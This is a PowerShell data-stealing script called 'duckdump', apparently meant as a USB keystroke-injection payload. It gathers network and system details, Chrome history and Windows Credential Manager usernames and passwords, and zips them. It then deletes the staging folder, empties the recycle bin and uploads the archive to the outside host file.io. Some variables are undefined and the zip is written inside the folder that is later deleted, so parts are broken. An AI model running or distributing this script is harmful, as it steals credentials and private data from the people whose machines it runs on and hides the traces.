# Specify the path for the new folder
$folderPath = Join-Path $env:USERPROFILE "Documents\duckdump"

# Create the new folder
New-Item -Path $folderPath -ItemType Directory

##############################################

# Get network adapters and related information
$networkAdapters = Get-NetAdapter

# Create an empty array to store network information
$networkInfo = @()

# Loop through each network adapter
foreach ($adapter in $networkAdapters) {
    $adapterInfo = @{
        "Name"            = $adapter.Name
        "Description"     = $adapter.Description
        "MACAddress"      = $adapter.MacAddress
        "IPv4Address"     = ($adapter | Get-NetIPAddress -AddressFamily IPv4).IPAddress
        "IPv6Address"     = ($adapter | Get-NetIPAddress -AddressFamily IPv6).IPAddress
        "Status"          = $adapter.Status
        "Speed(Mbps)"     = $adapter.LinkSpeed
    }
    $networkInfo += New-Object PSObject -Property $adapterInfo
}

# Specify the output file path
$outputFilePath = Join-Path $folderPath "network.txt"

# Export network information to a text file
$networkInfo | Format-Table -AutoSize | Out-File -FilePath $outputFilePath

Write-Host "Network information exported to $outputFilePath"

##############################################

# Get computer information
$computerInfo = @{
    "Hostname"          = $env:COMPUTERNAME
    "Manufacturer"      = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
    "Model"             = (Get-WmiObject -Class Win32_ComputerSystem).Model
    "Processor"         = (Get-WmiObject -Class Win32_Processor).Name
    "Memory(GB)"        = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    "OperatingSystem"   = (Get-WmiObject -Class Win32_OperatingSystem).Caption
    "Architecture"      = (Get-WmiObject -Class Win32_OperatingSystem).OSArchitecture
    "Username"          = $env:USERNAME
}

# Specify the output file path
$outputFilePath = Join-Path $folderPath "computer.txt"

# Create a formatted output
$output = $computerInfo | Format-Table -AutoSize | Out-String

# Export the information to a text file
$output | Out-File -FilePath $outputFilePath

Write-Host "Computer information exported to $outputFilePath"

##############################################

#extract browser history
$Path = Join-Path $env:USERPROFILE "AppData\Local\Google\Chrome\User Data\Default\History" 
if (-not (Test-Path -Path $Path)) { 
    Write-Verbose "[!] Could not find Chrome History for username: $UserName" 
} 
$Regex = '(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?' 
$Value = Get-Content -Path $Path |Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique 
$OutputData = $Value | ForEach-Object { 
    $Key = $_ 
    if ($Key -match $Search){ 
        New-Object -TypeName PSObject -Property @{ 
            User = $UserName 
            Browser = 'Chrome' 
            DataType = 'History' 
            Data = $_ 
        } 
    } 
}

# Specify the output file path
$outputFilePath = Join-Path $folderPath "browser.txt"

$OutputData | Out-File -FilePath $outputFilePath

Write-Host "Browser history exported to $outputFilePath"

#############################################

#extract credential manager information
$credentialEntries = cmdkey /list | ForEach-Object {
    if ($_ -match "Target: (.*)") {
        $target = $Matches[1]
        $username = (cmdkey /generic:"$target" /username)
        $password = (cmdkey /generic:"$target" /password)
        
        [PSCustomObject]@{
            Target = $target
            Username = $username
            Password = $password
        }
    }
}

# Specify the output file path
$outputFilePath = Join-Path $folderPath "creds.txt"

$credentialEntries | Out-File -FilePath $outputFilePath

Write-Host "Credential manager information exported to $outputFilePath"


#############################################

$zipFilePath = Join-Path $folderPath "duckdump.zip"
Compress-Archive -Path $folderPath -DestinationPath $zipFilePath

Write-Host "Dump compressed to $sourceFolderPath"

#############################################

# Delete the folder
Remove-Item -Path $folderPath -Recurse -Force

# Empty the recycle bin
Clear-RecycleBin -Confirm:$false

Write-Host "Dump folder deleted and recycle bin emptied."

############################################

# API endpoint for file.io
$uploadUrl = "https://file.io"

# Create a new WebClient
$webClient = New-Object System.Net.WebClient

# Upload the file
$responseBytes = $webClient.UploadFile($uploadUrl, $zipFilePath)

# Convert the response bytes to a string
$responseString = [System.Text.Encoding]::UTF8.GetString($responseBytes)

# Close the WebClient
$webClient.Dispose()


# Parse the response JSON to get the link
$responseObject = ConvertFrom-Json $responseString
$link = $responseObject.link

# Display the link
Write-Host "Dump uploaded to $link"
